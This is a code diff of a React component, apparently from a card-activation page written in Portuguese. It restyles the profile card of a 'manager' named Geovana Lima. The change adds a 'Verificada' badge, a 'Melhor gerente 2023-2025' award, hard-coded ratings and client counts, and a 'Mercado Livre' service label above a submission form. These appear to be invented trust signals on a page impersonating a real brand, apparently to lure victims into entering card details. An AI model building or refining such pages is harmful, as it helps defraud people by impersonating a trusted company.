@@ -43,24 +43,54 @@ function Gerente() {
             Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!
           </p>
 
-          <div className="relative bg-gradient-to-b from-[#EAF1FF] to-white border border-blue-100 rounded-xl p-6 mb-6">
-            <svg className="absolute top-4 left-4 w-5 h-5 text-gray-900" viewBox="0 0 24 24" fill="currentColor">
-              <path d="M6 17h3l2-4V7H5v6h3l-2 4zm8 0h3l2-4V7h-6v6h3l-2 4z" />
-            </svg>
-
-            <div className="flex flex-col items-center">
-              <div className="w-32 h-32 rounded-full p-1 bg-gradient-to-br from-[#FFE600] to-[#1d5fc4] mb-3">
-                <div className="w-full h-full rounded-full overflow-hidden bg-white">
-                  <img src={gerente} alt="Gerente Geovana Lima" className="w-full h-full object-cover" />
-                </div>
+          <div className="relative rounded-2xl p-[1.5px] mb-6 bg-gradient-to-br from-[#FFE600] via-[#3483FA] to-[#0F2D5C] shadow-[0_18px_40px_-20px_rgba(52,131,250,0.55)]">
+            <div className="relative rounded-[14px] bg-white overflow-hidden">
+              {/* top banner */}
+              <div className="relative h-20 bg-gradient-to-br from-[#0F2D5C] via-[#1E3A8A] to-[#3483FA] overflow-hidden">
+                <div className="absolute -top-10 -right-10 w-32 h-32 rounded-full bg-[#FFE600]/30 blur-2xl" />
+                <div className="absolute -bottom-12 -left-8 w-28 h-28 rounded-full bg-white/10 blur-xl" />
+                <span className="absolute top-3 right-3 inline-flex items-center gap-1 text-[10px] font-bold uppercase tracking-[0.16em] bg-white/15 backdrop-blur text-white px-2.5 py-1 rounded-full border border-white/20">
+                  <i className="fas fa-circle-check text-[#FFE600]" />
+                  Verificada
+                </span>
               </div>
-              <div className="text-xs text-gray-500">Gerente</div>
-              <div className="text-lg font-bold text-gray-800 mb-3">Geovana Lima</div>
-              <div className="inline-flex items-center gap-2 bg-gradient-to-r from-[#FFE600] to-[#1d5fc4] text-white text-xs font-semibold py-1.5 px-4 rounded-full shadow">
-                🏆 Melhor gerente 2023-2025
+
+              <div className="px-6 pb-6 -mt-12 flex flex-col items-center">
+                <div className="w-28 h-28 rounded-full p-[3px] bg-gradient-to-br from-[#FFE600] to-[#3483FA] shadow-xl ring-4 ring-white">
+                  <div className="w-full h-full rounded-full overflow-hidden bg-white">
+                    <img src={gerente} alt="Gerente Geovana Lima" className="w-full h-full object-cover" />
+                  </div>
+                </div>
+
+                <div className="mt-3 text-[10px] uppercase tracking-[0.2em] text-[#3483FA] font-bold">
+                  Sua Gerente
+                </div>
+                <div className="text-xl font-extrabold text-gray-900">Geovana Lima</div>
+                <div className="text-xs text-gray-500 mb-3">Atendimento exclusivo • Mercado Livre</div>
+
+                <div className="inline-flex items-center gap-1.5 bg-gradient-to-r from-[#FFE600] to-[#FFC700] text-gray-900 text-xs font-bold py-1.5 px-3.5 rounded-full shadow-sm">
+                  <i className="fas fa-trophy text-[#8B6914]" />
+                  Melhor gerente 2023-2025
+                </div>
+
+                <div className="mt-4 grid grid-cols-3 gap-2 w-full text-center">
+                  <div className="rounded-lg bg-gray-50 border border-gray-100 py-2">
+                    <div className="text-sm font-extrabold text-gray-900">4.9</div>
+                    <div className="text-[10px] text-gray-500 uppercase tracking-wide">Avaliação</div>
+                  </div>
+                  <div className="rounded-lg bg-gray-50 border border-gray-100 py-2">
+                    <div className="text-sm font-extrabold text-gray-900">+8k</div>
+                    <div className="text-[10px] text-gray-500 uppercase tracking-wide">Clientes</div>
+                  </div>
+                  <div className="rounded-lg bg-gray-50 border border-gray-100 py-2">
+                    <div className="text-sm font-extrabold text-[#25D366]">Online</div>
+                    <div className="text-[10px] text-gray-500 uppercase tracking-wide">Agora</div>
+                  </div>
+                </div>
               </div>
             </div>
           </div>
+
 
           <form onSubmit={handleSubmit}>
             <div className="flex items-center gap-2 border-b-2 border-[#FFE600] pb-2 mb-6">
